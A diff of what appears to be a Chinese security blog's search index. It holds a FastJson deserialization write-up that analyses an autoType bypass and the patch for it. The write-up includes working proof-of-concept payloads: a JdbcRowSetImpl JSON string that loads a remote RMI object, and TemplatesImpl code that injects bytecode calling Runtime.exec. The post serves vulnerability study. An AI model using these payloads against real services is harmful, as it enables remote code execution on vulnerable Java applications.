@@ -1,23 +1,6 @@
 <?xml version="1.0" encoding="utf-8"?>
 <search>
   <entry>
-    <title>后台getshell姿势总结</title>
-    <url>/2020/07/22/back-getshell/</url>
-    <content><![CDATA[<p>代码审计开始学习中，这篇文章旨在总结拿到后台密码/能够登入后台之后，常见的getshell的方式，给自己做个笔记。</p>
-<a id="more"></a>
-
-<h1 id="类别"><a href="#类别" class="headerlink" title="类别"></a>类别</h1><h2 id="文件上传"><a href="#文件上传" class="headerlink" title="文件上传"></a>文件上传</h2><h3 id="直接的文件上传点"><a href="#直接的文件上传点" class="headerlink" title="直接的文件上传点"></a>直接的文件上传点</h3><h3 id="修改网站上传类型"><a href="#修改网站上传类型" class="headerlink" title="修改网站上传类型"></a>修改网站上传类型</h3><h2 id="配置文件"><a href="#配置文件" class="headerlink" title="配置文件"></a>配置文件</h2><p>进入后台后，可以通过修改网站的配置文件，闭合原来的源码，从而插入代码。</p>
-<h2 id="模版注入"><a href="#模版注入" class="headerlink" title="模版注入"></a>模版注入</h2><h2 id="编辑器漏洞"><a href="#编辑器漏洞" class="headerlink" title="编辑器漏洞"></a>编辑器漏洞</h2><p>留意CMS使用的编辑器模版是否是已知漏洞的版本。</p>
-<h2 id="执行sql语句"><a href="#执行sql语句" class="headerlink" title="执行sql语句"></a>执行sql语句</h2><p>需要知道网站的绝对路径</p>
-<h2 id="文件包含"><a href="#文件包含" class="headerlink" title="文件包含"></a>文件包含</h2>]]></content>
-      <categories>
-        <category>代码审计</category>
-      </categories>
-      <tags>
-        <tag>php</tag>
-      </tags>
-  </entry>
-  <entry>
     <title>SSRF-内网Redis Getshell</title>
     <url>/2020/04/17/SSRF-Redis/</url>
     <content><![CDATA[<p>Redis是常见的内网服务，因其默认配置未授权访问或使用弱口令认证，可以导致getshell。这篇文章通过实验的方式介绍了四种内网Redis Getshell的方式。</p>
@@ -530,6 +513,67 @@
       </tags>
   </entry>
   <entry>
+    <title>FastJson反序列化回顾系列(四)</title>
+    <url>/2020/05/16/fastjson-4/</url>
+    <content><![CDATA[<p>上一个回顾中打补丁的方式是若存在一个<code>L</code>与<code>;</code>就去掉，若存在两个，则抛出异常。看起来已经无法通过添加<code>L</code>与<code>;</code>的方式来进行。之前在回顾系列(二)中提到过，除了添加<code>L;</code>之后，还可以添加<code>[</code>，不过在当时并没成功。事实上，它是可以成功的。这篇文件就介绍了这一方式。</p>
+<a id="more"></a>
+<p>整个复现系列的payload放在了<a href="https://github.com/ananaskr/FastJson_Payload/tree/master/project/src/main/java" target="_blank" rel="noopener">github</a>上。</p>
+<h1 id="漏洞信息"><a href="#漏洞信息" class="headerlink" title="漏洞信息"></a>漏洞信息</h1><h2 id="影响版本"><a href="#影响版本" class="headerlink" title="影响版本"></a>影响版本</h2><ul>
+<li>1.2.25 &lt;= fastjson &lt;= 1.2.43</li>
+</ul>
+<h2 id="利用条件"><a href="#利用条件" class="headerlink" title="利用条件"></a>利用条件</h2><ul>
+<li>打开autotype</li>
+</ul>
+<h2 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h2><p>由于打补丁的方式非常简单粗暴，若className开头是<code>LL</code>就会抛出错误，所以无法利用<code>LL</code>这个点了。如下所示:</p>
+<p><img src="1.png" alt=""></p>
+<p>考虑利用另一个点<code>[</code>。定位到loadClass()函数。</p>
+<p><img src="2.png" alt=""></p>
+<p>之前分析得很浅，因为length为0，会抛出异常。我们直接加<code>[</code>是不可以的，那么应该如何构造使之能够可以呢？</p>
+<p>根据FastJson反序列化的流程，由于@type是一个<code>[</code>，因此会调用到<code>com.alibaba.fastjson.serializer.ObjectArrayCodeC.class</code>中的deserialze()函数，跟进去，然后定位到如下图所示的位置:</p>
+<p><img src="3.png" alt=""></p>
+<p>首先通过clazz.getComponentType()获取到componentType，然后进入parser.parseArry()函数，跟进它。</p>
+<p><img src="4.png" alt=""></p>
+<p>可以看到此时的token值若不为14，即当前不为<code>[</code>，就会抛出异常，因此在””值后面紧跟着<code>[</code>。然后会进入lexer.nextToken()，跟进它。</p>
+<p><img src="5.png" alt=""></p>
+<p>如果当前的ch为</p>
+<ul>
+<li><code>{</code>，即在<code>[</code>之后的为<code>{</code>，则将token赋值为12，且移到下一个字符<code>&quot;</code></li>
+<li><code>[</code>，即在<code>[</code>之后的为<code>[</code>，则将token赋值为14，且移到下一个字符<code>&quot;</code></li>
+</ul>
+<blockquote>
+<p>事实上，这里只能写<code>{</code>，因为若token为14，在接下来的过程中会报错，我们后续会讲到这一点。</p>
+</blockquote>
+<p>在经历完这个之后，最终会走到((ObjectDeserializer)deserializer).deserialze()函数，如下图所示:</p>
+<p><img src="6.png" alt=""></p>
+<p>跟进它，它又会将后续的值进行反序列化。如下所示:</p>
+<p><img src="7.png" alt=""></p>
+<p>最终会调用到给autoCommit赋值的setAutoCommit函数，从而RCE。</p>
+<p>那么再考虑一下上述第二种方式为什么不可以。同样跟进到deserialze函数里，如下图所示:</p>
+<p><img src="8.png" alt=""></p>
+<p>它最终抛出异常，从而无法RCE。</p>
+<h2 id="EXP构造"><a href="#EXP构造" class="headerlink" title="EXP构造"></a>EXP构造</h2><h3 id="JdbcRowSetImpl"><a href="#JdbcRowSetImpl" class="headerlink" title="JdbcRowSetImpl"></a>JdbcRowSetImpl</h3><p>根据上述分析，EXP如下所示:</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#123;</span><br><span class="line">	&quot;@type&quot;:&quot;[com.sun.rowset.JdbcRowSetImpl&quot;[&#123;</span><br><span class="line">					&quot;dataSourceName&quot;:&quot;rmi:&#x2F;&#x2F;127.0.0.1:1099&#x2F;EvilObject&quot;,</span><br><span class="line">					&quot;autoCommit&quot;:true</span><br><span class="line">					&#125;</span><br></pre></td></tr></table></figure>
+
+<p>完整的demo</p>
+<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> com.alibaba.fastjson.JSON;</span><br><span class="line"><span class="keyword">import</span> com.alibaba.fastjson.parser.ParserConfig;</span><br><span class="line"></span><br><span class="line"><span class="comment">//@dependency&#123;fastjson:1.2.25-1.2.43&#125;</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">jdbcrowsetimpl4</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String args[])</span> </span>&#123;</span><br><span class="line">        String payload = <span class="string">"&#123;\"@type\":\"[com.sun.rowset.JdbcRowSetImpl\"[&#123;\"dataSourceName\":\"rmi://127.0.0.1:1099/EvilObject\",\"autoCommit\":true&#125;"</span>;</span><br><span class="line">        ParserConfig config = <span class="keyword">new</span> ParserConfig();</span><br><span class="line">        config.getGlobalInstance().setAutoTypeSupport(<span class="keyword">true</span>);</span><br><span class="line">        Object res = JSON.parse(payload);</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<h3 id="TemplatesImpl"><a href="#TemplatesImpl" class="headerlink" title="TemplatesImpl"></a>TemplatesImpl</h3><p>完整的demo</p>
+<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> com.alibaba.fastjson.JSON;</span><br><span class="line"><span class="keyword">import</span> com.alibaba.fastjson.parser.Feature;</span><br><span class="line"><span class="keyword">import</span> com.alibaba.fastjson.parser.ParserConfig;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.DOM;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.TransletException;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xml.internal.dtm.DTMAxisIterator;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xml.internal.serializer.SerializationHandler;</span><br><span class="line"><span class="keyword">import</span> javassist.ClassClassPath;</span><br><span class="line"><span class="keyword">import</span> javassist.ClassPool;</span><br><span class="line"><span class="keyword">import</span> javassist.CtClass;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.codec.binary.Base64;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.*;</span><br><span class="line"></span><br><span class="line"><span class="comment">//@dependency&#123;fastjson:1.2.25-1.2.43&#125;</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">templatesimpl4</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="class"><span class="keyword">class</span> <span class="title">StubTransletPayload</span> <span class="keyword">extends</span> <span class="title">AbstractTranslet</span> <span class="keyword">implements</span> <span class="title">Serializable</span> </span>&#123;</span><br><span class="line">        <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="keyword">long</span> serialVersionUID = -<span class="number">5971610431559700674L</span>;</span><br><span class="line"></span><br><span class="line">        <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">transform</span><span class="params">(DOM document, SerializationHandler[] handlers)</span> <span class="keyword">throws</span> TransletException </span>&#123;&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">transform</span><span class="params">(DOM document, DTMAxisIterator iterator, SerializationHandler handler)</span> <span class="keyword">throws</span> TransletException</span>&#123;&#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception</span>&#123;</span><br><span class="line"></span><br><span class="line">        String command = <span class="string">"/Applications/Calculator.app/Contents/MacOS/Calculator"</span>;</span><br><span class="line">        String cmd = <span class="string">"java.lang.Runtime.getRuntime().exec(\""</span> +</span><br><span class="line">                command.replaceAll(<span class="string">"\\\\"</span>,<span class="string">"\\\\\\\\"</span>).replaceAll(<span class="string">"\""</span>, <span class="string">"\\\""</span>) +</span><br><span class="line">                <span class="string">"\");"</span>;</span><br><span class="line"></span><br><span class="line">        ClassPool pool = ClassPool.getDefault();</span><br><span class="line">        pool.insertClassPath(<span class="keyword">new</span> ClassClassPath(StubTransletPayload<span class="class">.<span class="keyword">class</span>))</span>;</span><br><span class="line">        pool.insertClassPath(<span class="keyword">new</span> ClassClassPath(AbstractTranslet<span class="class">.<span class="keyword">class</span>))</span>;</span><br><span class="line">        CtClass clazz = pool.get(StubTransletPayload<span class="class">.<span class="keyword">class</span>.<span class="title">getName</span>())</span>;</span><br><span class="line"></span><br><span class="line">        clazz.makeClassInitializer().insertAfter(cmd);</span><br><span class="line">        CtClass superC = pool.get(AbstractTranslet<span class="class">.<span class="keyword">class</span>.<span class="title">getName</span>())</span>;</span><br><span class="line">        clazz.setSuperclass(superC);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">byte</span>[] classBytes = clazz.toBytecode();</span><br><span class="line"></span><br><span class="line">        String bytes1 = Base64.encodeBase64String(classBytes);</span><br><span class="line">        String NASTY_CLASS = <span class="string">"[com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl"</span>;</span><br><span class="line">        String text1 = <span class="string">"&#123;\"@type\":\""</span> + NASTY_CLASS +</span><br><span class="line">                <span class="string">"\"[&#123;\"_bytecodes\":[\""</span>+bytes1+<span class="string">"\"],'_name':'a.b','_tfactory':&#123; &#125;,\"_outputProperties\":&#123; &#125;,"</span> +</span><br><span class="line">                <span class="string">"\"_name\":\"a\",\"_version\":\"1.0\",\"allowedProtocols\":\"all\"&#125;\n"</span>;</span><br><span class="line"></span><br><span class="line">        ParserConfig config = <span class="keyword">new</span> ParserConfig();</span><br><span class="line">        config.getGlobalInstance().setAutoTypeSupport(<span class="keyword">true</span>);</span><br><span class="line">        Object res = JSON.parse(text1, Feature.SupportNonPublicField);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<h1 id="补丁"><a href="#补丁" class="headerlink" title="补丁"></a>补丁</h1><p><img src="9.png" alt=""></p>
+<p>从这个补丁可以看出，在1.2.44版本中，它删掉了原来的判断<code>LL</code>的方式，而是改为了若以<code>[</code>开头或以<code>;</code>结尾，都会抛出异常。</p>
+<h1 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h1><ul>
+<li><a href="https://mntn0x.github.io/2020/04/07/Fastjson%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/#1-2-43%E7%89%88%E6%9C%AC%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96RCE" target="_blank" rel="noopener">Fastjson漏洞复现</a></li>
+</ul>
+]]></content>
+      <categories>
+        <category>JAVA安全</category>
+      </categories>
+      <tags>
+        <tag>FastJson</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>FastJson反序列化回顾系列(五)</title>
     <url>/2020/05/16/fastjson-5/</url>
     <content><![CDATA[<p>1.2.44版本中对<code>L</code>和<code>[</code>开头的情况进行了防御，使得在1.2.44版本时并没有出现任何的checkAutoType的绕过。但是却出现了对于黑名单的绕过。本篇文章对此进行深入的分析。</p>
@@ -624,67 +668,6 @@
       </tags>
   </entry>
   <entry>
-    <title>FastJson反序列化回顾系列(四)</title>
-    <url>/2020/05/16/fastjson-4/</url>
-    <content><![CDATA[<p>上一个回顾中打补丁的方式是若存在一个<code>L</code>与<code>;</code>就去掉，若存在两个，则抛出异常。看起来已经无法通过添加<code>L</code>与<code>;</code>的方式来进行。之前在回顾系列(二)中提到过，除了添加<code>L;</code>之后，还可以添加<code>[</code>，不过在当时并没成功。事实上，它是可以成功的。这篇文件就介绍了这一方式。</p>
-<a id="more"></a>
-<p>整个复现系列的payload放在了<a href="https://github.com/ananaskr/FastJson_Payload/tree/master/project/src/main/java" target="_blank" rel="noopener">github</a>上。</p>
-<h1 id="漏洞信息"><a href="#漏洞信息" class="headerlink" title="漏洞信息"></a>漏洞信息</h1><h2 id="影响版本"><a href="#影响版本" class="headerlink" title="影响版本"></a>影响版本</h2><ul>
-<li>1.2.25 &lt;= fastjson &lt;= 1.2.43</li>
-</ul>
-<h2 id="利用条件"><a href="#利用条件" class="headerlink" title="利用条件"></a>利用条件</h2><ul>
-<li>打开autotype</li>
-</ul>
-<h2 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h2><p>由于打补丁的方式非常简单粗暴，若className开头是<code>LL</code>就会抛出错误，所以无法利用<code>LL</code>这个点了。如下所示:</p>
-<p><img src="1.png" alt=""></p>
-<p>考虑利用另一个点<code>[</code>。定位到loadClass()函数。</p>
-<p><img src="2.png" alt=""></p>
-<p>之前分析得很浅，因为length为0，会抛出异常。我们直接加<code>[</code>是不可以的，那么应该如何构造使之能够可以呢？</p>
-<p>根据FastJson反序列化的流程，由于@type是一个<code>[</code>，因此会调用到<code>com.alibaba.fastjson.serializer.ObjectArrayCodeC.class</code>中的deserialze()函数，跟进去，然后定位到如下图所示的位置:</p>
-<p><img src="3.png" alt=""></p>
-<p>首先通过clazz.getComponentType()获取到componentType，然后进入parser.parseArry()函数，跟进它。</p>
-<p><img src="4.png" alt=""></p>
-<p>可以看到此时的token值若不为14，即当前不为<code>[</code>，就会抛出异常，因此在””值后面紧跟着<code>[</code>。然后会进入lexer.nextToken()，跟进它。</p>
-<p><img src="5.png" alt=""></p>
-<p>如果当前的ch为</p>
-<ul>
-<li><code>{</code>，即在<code>[</code>之后的为<code>{</code>，则将token赋值为12，且移到下一个字符<code>&quot;</code></li>
-<li><code>[</code>，即在<code>[</code>之后的为<code>[</code>，则将token赋值为14，且移到下一个字符<code>&quot;</code></li>
-</ul>
-<blockquote>
-<p>事实上，这里只能写<code>{</code>，因为若token为14，在接下来的过程中会报错，我们后续会讲到这一点。</p>
-</blockquote>
-<p>在经历完这个之后，最终会走到((ObjectDeserializer)deserializer).deserialze()函数，如下图所示:</p>
-<p><img src="6.png" alt=""></p>
-<p>跟进它，它又会将后续的值进行反序列化。如下所示:</p>
-<p><img src="7.png" alt=""></p>
-<p>最终会调用到给autoCommit赋值的setAutoCommit函数，从而RCE。</p>
-<p>那么再考虑一下上述第二种方式为什么不可以。同样跟进到deserialze函数里，如下图所示:</p>
-<p><img src="8.png" alt=""></p>
-<p>它最终抛出异常，从而无法RCE。</p>
-<h2 id="EXP构造"><a href="#EXP构造" class="headerlink" title="EXP构造"></a>EXP构造</h2><h3 id="JdbcRowSetImpl"><a href="#JdbcRowSetImpl" class="headerlink" title="JdbcRowSetImpl"></a>JdbcRowSetImpl</h3><p>根据上述分析，EXP如下所示:</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#123;</span><br><span class="line">	&quot;@type&quot;:&quot;[com.sun.rowset.JdbcRowSetImpl&quot;[&#123;</span><br><span class="line">					&quot;dataSourceName&quot;:&quot;rmi:&#x2F;&#x2F;127.0.0.1:1099&#x2F;EvilObject&quot;,</span><br><span class="line">					&quot;autoCommit&quot;:true</span><br><span class="line">					&#125;</span><br></pre></td></tr></table></figure>
-
-<p>完整的demo</p>
-<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> com.alibaba.fastjson.JSON;</span><br><span class="line"><span class="keyword">import</span> com.alibaba.fastjson.parser.ParserConfig;</span><br><span class="line"></span><br><span class="line"><span class="comment">//@dependency&#123;fastjson:1.2.25-1.2.43&#125;</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">jdbcrowsetimpl4</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String args[])</span> </span>&#123;</span><br><span class="line">        String payload = <span class="string">"&#123;\"@type\":\"[com.sun.rowset.JdbcRowSetImpl\"[&#123;\"dataSourceName\":\"rmi://127.0.0.1:1099/EvilObject\",\"autoCommit\":true&#125;"</span>;</span><br><span class="line">        ParserConfig config = <span class="keyword">new</span> ParserConfig();</span><br><span class="line">        config.getGlobalInstance().setAutoTypeSupport(<span class="keyword">true</span>);</span><br><span class="line">        Object res = JSON.parse(payload);</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
-
-<h3 id="TemplatesImpl"><a href="#TemplatesImpl" class="headerlink" title="TemplatesImpl"></a>TemplatesImpl</h3><p>完整的demo</p>
-<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> com.alibaba.fastjson.JSON;</span><br><span class="line"><span class="keyword">import</span> com.alibaba.fastjson.parser.Feature;</span><br><span class="line"><span class="keyword">import</span> com.alibaba.fastjson.parser.ParserConfig;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.DOM;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.TransletException;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xml.internal.dtm.DTMAxisIterator;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xml.internal.serializer.SerializationHandler;</span><br><span class="line"><span class="keyword">import</span> javassist.ClassClassPath;</span><br><span class="line"><span class="keyword">import</span> javassist.ClassPool;</span><br><span class="line"><span class="keyword">import</span> javassist.CtClass;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.codec.binary.Base64;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.*;</span><br><span class="line"></span><br><span class="line"><span class="comment">//@dependency&#123;fastjson:1.2.25-1.2.43&#125;</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">templatesimpl4</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="class"><span class="keyword">class</span> <span class="title">StubTransletPayload</span> <span class="keyword">extends</span> <span class="title">AbstractTranslet</span> <span class="keyword">implements</span> <span class="title">Serializable</span> </span>&#123;</span><br><span class="line">        <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="keyword">long</span> serialVersionUID = -<span class="number">5971610431559700674L</span>;</span><br><span class="line"></span><br><span class="line">        <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">transform</span><span class="params">(DOM document, SerializationHandler[] handlers)</span> <span class="keyword">throws</span> TransletException </span>&#123;&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">transform</span><span class="params">(DOM document, DTMAxisIterator iterator, SerializationHandler handler)</span> <span class="keyword">throws</span> TransletException</span>&#123;&#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception</span>&#123;</span><br><span class="line"></span><br><span class="line">        String command = <span class="string">"/Applications/Calculator.app/Contents/MacOS/Calculator"</span>;</span><br><span class="line">        String cmd = <span class="string">"java.lang.Runtime.getRuntime().exec(\""</span> +</span><br><span class="line">                command.replaceAll(<span class="string">"\\\\"</span>,<span class="string">"\\\\\\\\"</span>).replaceAll(<span class="string">"\""</span>, <span class="string">"\\\""</span>) +</span><br><span class="line">                <span class="string">"\");"</span>;</span><br><span class="line"></span><br><span class="line">        ClassPool pool = ClassPool.getDefault();</span><br><span class="line">        pool.insertClassPath(<span class="keyword">new</span> ClassClassPath(StubTransletPayload<span class="class">.<span class="keyword">class</span>))</span>;</span><br><span class="line">        pool.insertClassPath(<span class="keyword">new</span> ClassClassPath(AbstractTranslet<span class="class">.<span class="keyword">class</span>))</span>;</span><br><span class="line">        CtClass clazz = pool.get(StubTransletPayload<span class="class">.<span class="keyword">class</span>.<span class="title">getName</span>())</span>;</span><br><span class="line"></span><br><span class="line">        clazz.makeClassInitializer().insertAfter(cmd);</span><br><span class="line">        CtClass superC = pool.get(AbstractTranslet<span class="class">.<span class="keyword">class</span>.<span class="title">getName</span>())</span>;</span><br><span class="line">        clazz.setSuperclass(superC);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">byte</span>[] classBytes = clazz.toBytecode();</span><br><span class="line"></span><br><span class="line">        String bytes1 = Base64.encodeBase64String(classBytes);</span><br><span class="line">        String NASTY_CLASS = <span class="string">"[com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl"</span>;</span><br><span class="line">        String text1 = <span class="string">"&#123;\"@type\":\""</span> + NASTY_CLASS +</span><br><span class="line">                <span class="string">"\"[&#123;\"_bytecodes\":[\""</span>+bytes1+<span class="string">"\"],'_name':'a.b','_tfactory':&#123; &#125;,\"_outputProperties\":&#123; &#125;,"</span> +</span><br><span class="line">                <span class="string">"\"_name\":\"a\",\"_version\":\"1.0\",\"allowedProtocols\":\"all\"&#125;\n"</span>;</span><br><span class="line"></span><br><span class="line">        ParserConfig config = <span class="keyword">new</span> ParserConfig();</span><br><span class="line">        config.getGlobalInstance().setAutoTypeSupport(<span class="keyword">true</span>);</span><br><span class="line">        Object res = JSON.parse(text1, Feature.SupportNonPublicField);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-
-<h1 id="补丁"><a href="#补丁" class="headerlink" title="补丁"></a>补丁</h1><p><img src="9.png" alt=""></p>
-<p>从这个补丁可以看出，在1.2.44版本中，它删掉了原来的判断<code>LL</code>的方式，而是改为了若以<code>[</code>开头或以<code>;</code>结尾，都会抛出异常。</p>
-<h1 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h1><ul>
-<li><a href="https://mntn0x.github.io/2020/04/07/Fastjson%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/#1-2-43%E7%89%88%E6%9C%AC%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96RCE" target="_blank" rel="noopener">Fastjson漏洞复现</a></li>
-</ul>
-]]></content>
-      <categories>
-        <category>JAVA安全</category>
-      </categories>
-      <tags>
-        <tag>FastJson</tag>
-      </tags>
-  </entry>
-  <entry>
     <title>FastJson反序列化回顾系列(七)</title>
     <url>/2020/05/17/fastjson-7/</url>
     <content><![CDATA[<p>此后从1.2.48-1.2.68都是基于黑名单绕过的思路来进行利用的。此次介绍fastjson&lt;=1.2.62版本和fastjson&lt;=1.2.66版本的利用方式。</p>
@@ -747,6 +730,126 @@
 <h2 id="补丁-1"><a href="#补丁-1" class="headerlink" title="补丁"></a>补丁</h2><p>增加黑名单。而且在1.2.68也就是最新版本中增加了新的安全参数Safe_mode。打开这个模式之后直接禁用autoType功能。虽然有这个Safe_mode，如果开启这个模式的话，相当于禁用了@type fastjson反序列化这个功能。</p>
 <h1 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h1><ul>
 <li><a href="https://drops.blbana.cc/2020/04/16/Fastjson%E5%8E%86%E5%8F%B2%E8%A1%A5%E4%B8%81Bypass%E5%88%86%E6%9E%90/#%E7%89%88%E6%9C%AC1-2-47" target="_blank" rel="noopener">Fastjson历史补丁Bypass分析</a></li>
+</ul>
+]]></content>
+      <categories>
+        <category>JAVA安全</category>
+      </categories>
+      <tags>
+        <tag>FastJson</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>FastJson反序列化介绍</title>
+    <url>/2020/05/20/fastjson-introduction/</url>
+    <content><![CDATA[<p>之前虽然看了FastJson相关的内容，在复现的时候还是遇到了不少问题。因为比较详细地分析了下FastJson反序列化的过程，因此，记录了下来。</p>
+<a id="more"></a>
+
+<h2 id="FastJson简介"><a href="#FastJson简介" class="headerlink" title="FastJson简介"></a>FastJson简介</h2><p>FastJson自己实现了一套反序列化的机制，并没有使用默认的readObject()，在序列化反序列化的时候会进行一些操作，调用到一些setter和getter函数，从而造成命令执行。</p>
+<h3 id="API介绍"><a href="#API介绍" class="headerlink" title="API介绍"></a>API介绍</h3><ul>
+<li>序列化<ul>
+<li>JSON.toJSONString()</li>
+</ul>
+</li>
+<li>反序列化<ul>
+<li>JSON.parse()   返回实际类型对象</li>
+<li>JSON.parseObject()   返回JSONObject类型对象</li>
+</ul>
+</li>
+</ul>
+<blockquote>
+<p>FastJson中提供特殊字段符<code>@type</code>。该字段可以指定反序列化任意类，并在反序列化过程中自动调用类中属性的公有的set、get、is方法。(这个is方法有待验证)</p>
+</blockquote>
+<p>根据很多的实验可知，反序列化的规律:</p>
+<ul>
+<li>该类的无参构造函数被调用</li>
+<li>public修饰的属性直接反序列化成功</li>
+<li>private修饰的属性调用setter方法进行赋值</li>
+<li>getter函数会根据函数返回值不同，选择被调用或不被调用</li>
+</ul>
+<blockquote>
+<p>若一定要反序列化私有属性，可以给parseObject方法加入<code>Feature.SupportNonPublicField</code>。加入之后，它的调用方式与parse()一样，而与parseObject()无关了。后面会分析到这一点。</p>
+</blockquote>
+<h3 id="反序列化的对比"><a href="#反序列化的对比" class="headerlink" title="反序列化的对比"></a>反序列化的对比</h3><p>在FastJson的反序列化过程中，最明显的是parse()和parseObject()进行反序列化时，有着很大的不同。<br>从下图可以看到，JSONObject()调用了parse()方法，只是在最后多了一个toJSON()方法，它在toJSON()方法里面对所有的getter方法进行调用。<br><img src="1.png" alt=""></p>
+<p>除此之外，还有2个属性的影响:</p>
+<ul>
+<li>有无class类型</li>
+<li>有无Feature.SupportNonPublicField属性</li>
+</ul>
+<h4 id="1-有无class类型"><a href="#1-有无class类型" class="headerlink" title="1.有无class类型"></a>1.有无class类型</h4><p><strong>无class类型</strong>: parseObject(str)  </p>
+<ul>
+<li>调用类的构造方法</li>
+<li>所有属性的getter方法</li>
+<li>所有属性的setter方法</li>
+</ul>
+<p><strong>有class类型</strong>: parseObject(str,*.class)  </p>
+<ul>
+<li>调用类的构造方法</li>
+<li>非私有属性的setter方法</li>
+<li>特定类型的getter方法。</li>
+</ul>
+<h4 id="2-有Feature-SupportNonPublicField属性"><a href="#2-有Feature-SupportNonPublicField属性" class="headerlink" title="2.有Feature.SupportNonPublicField属性"></a>2.有Feature.SupportNonPublicField属性</h4><p>添加了Feature的parseObject()实际上等同于添加了Feature的parse()方法<br><img src="2.png" alt=""></p>
+<ul>
+<li>调用类的构造方法</li>
+<li>所有属性的setter方法</li>
+<li>特定类型的getter方法</li>
+</ul>
+<h3 id="FastJson反序列化流程"><a href="#FastJson反序列化流程" class="headerlink" title="FastJson反序列化流程"></a>FastJson反序列化流程</h3><p>由于parseObject()只是比parse()多了个toJSON()的过程。整个反序列化分析流程就以parseObject()为例。</p>
+<p>其中最主要的是DefaultJSONParser类，在该类中会调用很多其他的类来一起完成整个过程。来看看这个类。</p>
+<h4 id="DefaultJSONParser"><a href="#DefaultJSONParser" class="headerlink" title="DefaultJSONParser"></a>DefaultJSONParser</h4><p>在这个里面有几个比较关键的类:</p>
+<pre><code>+ JSONLexer
++ ParserConfig
++ JavaBeanDeserializer
++ JSONScanner
++ ObjectDeserializer</code></pre><p>首先进入parse()函数，在该函数中调用DefaultJSONParser的parse()函数。<br><img src="3.png" alt=""></p>
+<p>进入DefaultJSONParser.parse()函数，会根据lexer.token的值来选择处理方式。这个lexter是继承自JSONLexerBase的JSONScanner。它对很多特殊符号如<code>{</code>、<code>[</code>等都赋了值。显然由于字符串的第一个字符为<code>{</code>,其token值为12。则进入DefaultJSONParser.parseObject()函数。</p>
